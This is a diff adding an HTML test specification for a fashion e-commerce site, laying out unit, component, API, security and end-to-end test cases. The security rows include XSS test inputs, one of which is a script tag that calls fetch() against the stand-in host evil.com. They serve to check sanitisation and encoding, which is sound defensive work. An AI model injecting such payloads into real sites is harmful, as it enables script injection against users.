@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Style Haven - Shift-Left Test Pyramid (Sectioned Master Specification)</title>
+<style>
+  @page {
+    size: A4 landscape;
+    margin: 8mm 6mm 8mm 6mm;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1e293b;
+    line-height: 1.4;
+    font-size: 10px;
+    background-color: #ffffff;
+    margin: 0;
+    padding: 0;
+  }
+  h1 {
+    color: #0f172a;
+    font-size: 17px;
+    border-bottom: 2.5px solid #2563eb;
+    padding-bottom: 4px;
+    margin-top: 0;
+    margin-bottom: 6px;
+  }
+  h2 {
+    color: #1e3a8a;
+    font-size: 13px;
+    border-bottom: 1px solid #cbd5e1;
+    padding-bottom: 3px;
+    margin-top: 14px;
+    margin-bottom: 6px;
+    page-break-after: avoid;
+  }
+  h3 {
+    color: #1d4ed8;
+    font-size: 11.5px;
+    margin-top: 10px;
+    margin-bottom: 4px;
+    page-break-after: avoid;
+  }
+  p, li {
+    font-size: 9.5px;
+    color: #334155;
+    margin: 2px 0;
+  }
+  hr {
+    border: none;
+    border-top: 1px solid #e2e8f0;
+    margin: 8px 0;
+  }
+  pre {
+    background-color: #0f172a;
+    color: #f8fafc;
+    padding: 6px;
+    border-radius: 4px;
+    font-size: 8px;
+    overflow-x: auto;
+    page-break-inside: avoid;
+  }
+  code {
+    background-color: #f1f5f9;
+    color: #0f172a;
+    padding: 1px 3px;
+    border-radius: 3px;
+    font-size: 8.5px;
+    font-family: Menlo, Monaco, Consolas, monospace;
+  }
+  pre code {
+    background: transparent;
+    color: inherit;
+    padding: 0;
+  }
+  .table-container {
+    margin: 5px 0 8px 0;
+    width: 100%;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 8.5px;
+    page-break-inside: auto;
+  }
+  tr {
+    page-break-inside: avoid;
+    page-break-after: auto;
+  }
+  thead {
+    display: table-header-group;
+  }
+  th {
+    background-color: #1e293b;
+    color: #ffffff;
+    font-weight: 600;
+    text-align: left;
+    padding: 4px 4px;
+    border: 1px solid #334155;
+  }
+  td {
+    padding: 3.5px 4px;
+    border: 1px solid #cbd5e1;
+    vertical-align: top;
+    background-color: #ffffff;
+  }
+  tbody tr:nth-child(even) td {
+    background-color: #f8fafc;
+  }
+  strong {
+    color: #0f172a;
+  }
+</style>
+</head>
+<body>
+<h1>Style Haven: Shift-Left Test Pyramid Master Specification</h1>
+<p><strong>Document Title:</strong> Style Haven - Test Pyramid Layer-by-Layer Master Specification</p>
+<p><strong>Platform:</strong> Fashion E-commerce Marketplace</p>
+<p><strong>Document Version:</strong> 3.0.0-PROD</p>
+<p><strong>Author:</strong> Principal QA Test Architect</p>
+<p><strong>Scope:</strong> Exhaustive catalog of all 33 test scenarios cleanly partitioned into dedicated sections: <strong>Unit Tests</strong>, <strong>Component Tests</strong>, <strong>Integration & API Tests</strong>, and <strong>End-to-End (E2E) Tests</strong>.</p>
+<hr/>
+<h2>Executive Overview: Test Pyramid Architecture</h2>
+<pre><code>                         / \
+                        /   \
+                       / E2E \              [ 5 Tests  - 15% ]  -&gt; Section 4
+                      /-------\
+                     /  Comp.  \            [ 7 Tests  - 21% ]  -&gt; Section 2
+                    /-----------\
+                   / Integration \          [ 15+5 Tests - 46% ] -&gt; Section 3
+                  /---------------\
+                 /    Unit Tests   \        [ 6 Tests  - 18% ]  -&gt; Section 1
+                /-------------------\</code></pre>
+<hr/>
+<h2>SECTION 1: UNIT TESTS LAYER</h2>
+<li><strong>Shift-Left Focus:</strong> Shifted completely to developer local environment and pre-commit hooks (<code>husky</code>).</li>
+<li><strong>Target Execution Speed:</strong> <code>< 10ms</code> per test (Full suite runs in <code>< 1s</code>).</li>
+<li><strong>Recommended Frameworks:</strong> <code>Vitest</code> / <code>Jest</code></li>
+<li><strong>Scope:</strong> Pure functions, mathematical formulas, regex validators, string sanitizers, and array filtering algorithms.</li>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario Title</th><th>Specific Logic / Pure Function Tested</th><th>Test Input & Conditions</th><th>Expected Outcome</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-CRT-004-U</strong></td><td>Req 3.3</td><td>Promo code discount & subtotal calculation</td><td><code>calculateCartTotals(items, coupon, taxRate)</code></td><td>Subtotal: $95.00, Coupon: <code>SUMMER15</code> (15%), NY Tax: 8.875%, Free Shipping Threshold: $100</td><td>Discount = -$14.25; New Subtotal = $80.75; Shipping added ($10.00); Tax = $7.17; Total = $97.92</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-004-U</strong></td><td>Req 2.2</td><td>Size chart unit conversions (Metric vs Imperial)</td><td><code>convertDimensions(val, unit)</code></td><td>Imperial input: Chest = 38.0", Waist = 32.0", Hips = 40.0"</td><td>Function converts accurately using <code>* 2.54</code>: Chest = 96.52 cm, Waist = 81.28 cm, Hips = 101.60 cm</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-OPT-002-U</strong></td><td>Req 7.3</td><td>Loyalty rewards points valuation formula</td><td><code>pointsToDiscountValue(points, rate)</code></td><td>User points: 500 points, conversion rule: 100 points = $1.00</td><td>Returns exact monetary credit of <code>$5.00</code>; negative points throw <code>InvalidPointException</code></td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-001-U</strong></td><td>Req 1.1</td><td>Password complexity & email format regex</td><td><code>validatePasswordStrength(pwd)</code>, <code>validateEmail(email)</code></td><td>Passwords: <code>weakpass</code> vs <code>SecurePass#2026!</code>; Emails: <code>user@domain</code> vs <code>valid@stylehaven.io</code></td><td>Weak password rejected with specific policy violation flags; valid email and 12+ char password return <code>isValid: true</code></td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-004-U</strong></td><td>Req 1.2</td><td>Profile address XSS input sanitizer</td><td><code>sanitizeAddressInput(rawString)</code></td><td>Input: <code><script>alert('XSS')</script>Apt #4-B, St. John's</code></td><td>Script tags stripped/escaped; harmless punctuation preserved: <code>Apt #4-B, St. John's</code></td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-SUP-002-U</strong></td><td>Req 6.2</td><td>FAQ keyword search array filter</td><td><code>filterFaqList(faqs, query)</code></td><td>25 FAQ items, search query: <code>"refund timeline"</code></td><td>Returns only 2 matching entries tagged with returns/refunds; case-insensitive</td><td>QA Eng 1</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>SECTION 2: COMPONENT TESTS LAYER</h2>
+<li><strong>Shift-Left Focus:</strong> Frontend UI isolated testing; runs on every Pull Request build.</li>
+<li><strong>Target Execution Speed:</strong> <code>~200ms - 500ms</code> per component.</li>
+<li><strong>Recommended Frameworks:</strong> <code>Playwright Component Testing</code>, <code>React Testing Library (RTL)</code>, <code>Cypress Component</code></li>
+<li><strong>Scope:</strong> Interactive UI states, swatches, form error styling, disabled button states, modal drawers, and accessibility (ARIA).</li>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario Title</th><th>Component Under Test</th><th>Component Props / State</th><th>Expected Render & State Behavior</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-CAT-003-C</strong></td><td>Req 2.2</td><td>PDP variant switcher & inventory reflection</td><td><code><ProductVariantSelector /></code></td><td>Variant matrix with <code>[Cream, M]</code> stock = 0, <code>[Black, M]</code> stock = 5</td><td>Clicking Cream + M renders disabled "Out of Stock" button; switching to Black + M enables button with "Low Stock: Only 5 left!"</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-004-C</strong></td><td>Req 2.2</td><td>Size chart drawer & image zoom modal</td><td><code><SizeChartDrawer /></code>, <code><ImageZoom /></code></td><td><code>isOpen: true</code>, high-res image URL: <code>blazer_hero.webp</code></td><td>Drawer renders with accessible focus trap; unit toggle switches table values; hover zooms image without pixelation</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-003-C</strong></td><td>Req 3.2</td><td>Cart quantity adjustment exceeding stock</td><td><code><CartItemQuantityPicker /></code></td><td><code>currentQty: 2</code>, <code>maxAvailableStock: 2</code></td><td>Clicking <code>+</code> button is disabled; inline banner renders: <em>"Only 2 units available in stock"</em>; quantity clamped at 2</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CHK-001-C</strong></td><td>Req 4.1</td><td>Shipping tier radio selection</td><td><code><ShippingMethodSelector /></code></td><td>Rates: Standard ($8.00, 3-5 days), Express ($20.00, 1-2 days)</td><td>Selecting Express radio highlights row and dynamically updates estimated delivery date banner without page reload</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-SUP-002-C</strong></td><td>Req 6.2</td><td>FAQ accordion expand/collapse transitions</td><td><code><FaqAccordion /></code></td><td>List of 10 FAQ questions, initial state: collapsed</td><td>Clicking question expands answer with smooth CSS animation; updates <code>aria-expanded="true"</code>; closes on second click</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-OPT-001-C</strong></td><td>Req 7.1</td><td>Wishlist Heart icon toggle</td><td><code><WishlistToggleButton /></code></td><td>Initial state: <code>isSaved: false</code></td><td>Clicking button toggles SVG fill state to active red; fires micro-bounce animation; calls <code>onToggle(productId)</code> callback</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-004-C</strong></td><td>Req 1.2</td><td>Address form validation & error borders</td><td><code><AddressForm /></code></td><td>Form inputs with missing postal code or invalid characters</td><td>Leaving ZIP empty highlights field with red border and renders inline error: <em>"Postal code is required"</em></td><td>QA Eng 1</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>SECTION 3: INTEGRATION & API TESTS LAYER</h2>
+<li><strong>Shift-Left Focus:</strong> Backend services, REST/GraphQL APIs, database persistence, and message brokers; runs on PR builds.</li>
+<li><strong>Target Execution Speed:</strong> <code>~50ms - 300ms</code> per endpoint.</li>
+<li><strong>Recommended Frameworks:</strong> <code>Supertest</code>, <code>Playwright API</code>, <code>k6</code> (concurrency), <code>Testcontainers</code></li>
+<li><strong>Scope:</strong> Controller validation, database transactions, concurrency row-locks, token lifecycles, and security barriers.</li>
+<h3>3.1 Functional Integration & API Tests</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario Title</th><th>Target Endpoint / Event</th><th>Test Request Payload</th><th>Expected Response & DB Assertion</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-ACC-001-A</strong></td><td>Req 1.1</td><td>User registration endpoint</td><td><code>POST /api/v1/auth/register</code></td><td><code>{ email: "valid@sh.io", password: "SecurePass#2026!" }</code></td><td>HTTP 201 Created; password hashed via bcrypt in DB; verification token created in Redis/DB</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-003-A</strong></td><td>Req 1.1</td><td>Account lockout defense (Brute Force)</td><td><code>POST /api/v1/auth/login</code></td><td>5 consecutive invalid password payloads within 2 mins</td><td>6th attempt returns HTTP 429 Too Many Requests; lockout flag set in Redis for 15 mins</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-004-A</strong></td><td>Req 1.2</td><td>Address book persistence</td><td><code>POST /api/v1/user/addresses</code></td><td><code>{ addressLine1: "452 Fashion Ave", isDefault: true }</code></td><td>HTTP 200 OK; address persisted in DB; prior default address toggled to <code>isDefault: false</code></td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-005-A</strong></td><td>Req 1.3</td><td>Order history pagination</td><td><code>GET /api/v1/user/orders?page=2&limit=10</code></td><td>Authenticated user JWT with 25 past orders</td><td>HTTP 200 OK; payload returns exactly 10 order records with correct total page count metadata</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-CAT-001-A</strong></td><td>Req 2.1</td><td>Faceted product search against index</td><td><code>GET /api/v1/catalog/search?category=blazers&brand=atelier&size=M</code></td><td>URL query params executed against Elasticsearch cluster</td><td>HTTP 200 OK; only products matching all 3 filter criteria returned; response time < 200ms</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-002-A</strong></td><td>Req 2.1</td><td>Typo tolerance and fuzzy search fallback</td><td><code>GET /api/v1/catalog/search?q=vntage+jaket</code></td><td>Misspelled search tokens</td><td>HTTP 200 OK; fuzzy match suggests "vintage jacket"; returns relevant items; zero empty results</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-005-A</strong></td><td>Req 2.3</td><td>Personalized recommendation scoring</td><td><code>GET /api/v1/recommendations/user</code></td><td>User JWT with past viewing history: 5 outerwear items</td><td>HTTP 200 OK; returns items scored by affinity vector for category "outerwear" and designer affinity</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-002-A</strong></td><td>Req 3.1</td><td>Guest cart session migration upon login</td><td><code>POST /api/v1/cart/merge</code></td><td>Header: User JWT, Body: <code>{ guestCartSessionId: "uuid-123" }</code></td><td>HTTP 200 OK; guest items consolidated into database user cart; duplicate SKU quantities merged</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-005-A</strong></td><td>Req 3.3</td><td>Dynamic cart price update reconciliation</td><td><code>GET /api/v1/cart</code></td><td>Cart contains SKU whose catalog price dropped from $120 to $100</td><td>HTTP 200 OK; cart total reflects updated $100 price; response contains <code>priceChangedAlert: true</code></td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CHK-003-A</strong></td><td>Req 4.2</td><td>Payment gateway decline error handling</td><td><code>POST /api/v1/orders/checkout</code></td><td>Payment payload using Stripe decline token (<code>card_declined</code>)</td><td>HTTP 402 Payment Required; non-technical error returned; order remains in <code>UNPAID</code> status</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-005-A</strong></td><td>Req 4.3</td><td>Asynchronous order confirmation event</td><td>Message Queue (<code>RabbitMQ</code> / <code>Kafka</code>)</td><td>Event emitted: <code>order.created</code> with <code>{ orderId: "#SH-98241" }</code></td><td>Notification worker consumes event and dispatches email via SendGrid sandbox within 5s</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-SEL-001-A</strong></td><td>Req 5.1</td><td>Product listing creation with image upload</td><td><code>POST /api/v1/seller/products</code></td><td>Multipart form-data with variant SKUs, prices, WebP images</td><td>HTTP 201 Created; images processed to CDN; listing records written to relational catalog DB</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-SEL-002-A</strong></td><td>Req 5.2</td><td>Low stock automated alert trigger</td><td><code>POST /api/v1/inventory/decrement</code></td><td>Product inventory decremented from 3 units to 2 units</td><td>Alert daemon triggers; generates low stock badge and dispatches automated restock notification email</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-SEL-004-A</strong></td><td>Req 5.3</td><td>IDOR & RBAC cross-seller security</td><td><code>GET /api/v1/seller/orders/999</code></td><td>Seller A JWT attempting to view Order #999 owned by Seller B</td><td>HTTP 403 Forbidden or 404 Not Found; zero customer or financial data leaked</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-SUP-001-A</strong></td><td>Req 6.1</td><td>Real-time Live Chat WebSocket exchange</td><td><code>WS /api/v1/chat/ws</code></td><td>Client handshake with JWT; transmits message payload</td><td>Connection established; bidirectional message delivered to agent dashboard in < 500ms</td><td>QA Eng 1</td></tr>
+</tbody></table></div>
+<h3>3.2 Non-Functional, Concurrency & Security Edge Scenarios</h3>
+<div class="table-container"><table>
+<thead><tr><th>Edge ID</th><th>Scenario Title</th><th>Target Vector</th><th>Test Methodology</th><th>Expected Result</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>SEC-01</strong></td><td><strong>Inventory Race Condition (Double Spend)</strong></td><td>Stock Locking Engine</td><td><code>k6</code> script sends 50 concurrent <code>POST /checkout</code> requests for 1 remaining item</td><td>Exactly 1 transaction succeeds (HTTP 201); 49 requests receive HTTP 409 Conflict; stock never drops below 0</td><td>QA Eng 3</td></tr>
+<tr><td><strong>SEC-02</strong></td><td><strong>Payment Webhook Loss & Network Recovery</strong></td><td>Stripe Webhook Listener</td><td>Drop browser connection post-3DS; send raw webhook <code>payment_intent.succeeded</code></td><td>Backend fulfills order idempotently; order status transitions to <code>PAID</code> without browser redirect</td><td>QA Eng 3</td></tr>
+<tr><td><strong>SEC-03</strong></td><td><strong>IDOR & Authorization Fuzzing</strong></td><td>Seller & Order Endpoints</td><td>Automated OWASP ZAP script fuzzing user/order IDs across authorization barriers</td><td>All cross-tenant access attempts return HTTP 403/404; zero PII exposed</td><td>QA Eng 3</td></tr>
+<tr><td><strong>SEC-04</strong></td><td><strong>WebSocket Reconnection & Message Replay</strong></td><td>Live Chat Connection</td><td>Disconnect network socket for 15s; queue 2 client messages; restore connection</td><td>Socket automatically re-authenticates; flushes queued messages; reconciles conversation state</td><td>QA Eng 1</td></tr>
+<tr><td><strong>SEC-05</strong></td><td><strong>XSS Injection in Reviews & Seller Notes</strong></td><td>Review Submission API</td><td>Submitting <code><script>fetch('http://evil.com')</script></code> in product review body</td><td>Payload is HTML-encoded on ingestion; rendered harmlessly as plaintext text in browser</td><td>QA Eng 2</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>SECTION 4: END-TO-END (E2E) TESTS LAYER</h2>
+<li><strong>Shift-Left Focus:</strong> Reserved strictly for high-value Golden User Journeys and cross-domain third-party interactions.</li>
+<li><strong>Target Execution Speed:</strong> <code>~45s - 2 minutes</code> per test flow.</li>
+<li><strong>Recommended Frameworks:</strong> <code>Playwright E2E Runner</code> (Chromium, WebKit, Firefox)</li>
+<li><strong>Execution Gate:</strong> Merge to <code>main</code>, Nightly regression runs, and Release Candidate sign-offs.</li>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Golden Flow Name</th><th>Complete User Journey & Interaction</th><th>Browser Assertion & Verification Points</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-ACC-002-E</strong></td><td>Req 1.1</td><td>Social OAuth Login (Google & Apple)</td><td>User on login modal -> Clicks "Continue with Google" -> Browser navigates to Google consent -> User approves -> Callback to Style Haven</td><td>Browser receives OAuth callback; establishes authenticated session cookie; navbar updates to user avatar</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-CRT-001-E</strong></td><td>Req 3.1</td><td>Add to Cart & Mini-Cart Flyout Flow</td><td>Browse to PDP -> Select Size "M" + Color "Black" -> Click "Add to Cart"</td><td>Mini-cart drawer flies out from right side; line item reflects correct SKU and $120.00; cart badge updates from 0 to 1</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CHK-002-E</strong></td><td>Req 4.2</td><td><strong>Master Golden Shopper Checkout</strong></td><td>Cart -> Proceed to Checkout -> Confirm default shipping address -> Choose Express Shipping -> Input Card -> Solve 3DS OTP iframe -> Place Order</td><td>Payment captures; browser redirects to <code>/order-success/{orderId}</code>; order badge increments in Order History; cart resets to 0</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-004-E</strong></td><td>Req 4.2</td><td>Digital Wallet Transaction (Apple Pay / Google Pay)</td><td>User selects "Apple Pay" on checkout -> Web Payment sheet displays -> Biometric authentication completed</td><td>Order creates seamlessly without manual shipping address input; auth token validates on backend</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-SEL-003-E</strong></td><td>Req 5.3</td><td>Seller Order Fulfillment & Label Generation</td><td>Seller logs into dashboard -> Navigates to Unfulfilled Orders -> Inputs parcel weight -> Clicks "Generate Label"</td><td>Carrier API returns tracking number; order transitions to <code>SHIPPED</code>; printable shipping label PDF renders in browser</td><td>QA Eng 3</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>SECTION 5: MASTER SUMMARY & EXECUTION CADENCE</h2>
+<div class="table-container"><table>
+<thead><tr><th>Section</th><th>Pyramid Layer</th><th>Total Test Scenarios</th><th>Proportion</th><th>Average Speed</th><th>CI/CD Pipeline Stage</th></tr></thead><tbody>
+<tr><td><strong>Section 1</strong></td><td><strong>Unit Tests</strong></td><td><strong>6</strong></td><td>~18%</td><td>< 1 second</td><td>Pre-commit hook / Local IDE save</td></tr>
+<tr><td><strong>Section 2</strong></td><td><strong>Component Tests</strong></td><td><strong>7</strong></td><td>~21%</td><td>~15 seconds</td><td>Every Pull Request build</td></tr>
+<tr><td><strong>Section 3</strong></td><td><strong>Integration & API Tests</strong></td><td><strong>15 (+5 Edge)</strong></td><td>~46%</td><td>~45 seconds</td><td>Every Pull Request build</td></tr>
+<tr><td><strong>Section 4</strong></td><td><strong>End-to-End (E2E) Tests</strong></td><td><strong>5</strong></td><td>~15%</td><td>~2 minutes</td><td>Nightly / Production Release Gate</td></tr>
+<tr><td><strong>TOTAL</strong></td><td><strong>Full Quality Stack</strong></td><td><strong>33 Scenarios</strong></td><td><strong>100%</strong></td><td><strong>< 3.5 minutes total</strong></td><td>Continuous Shift-Left Quality Gate</td></tr>
+</tbody></table></div>
+</body>
+</html>
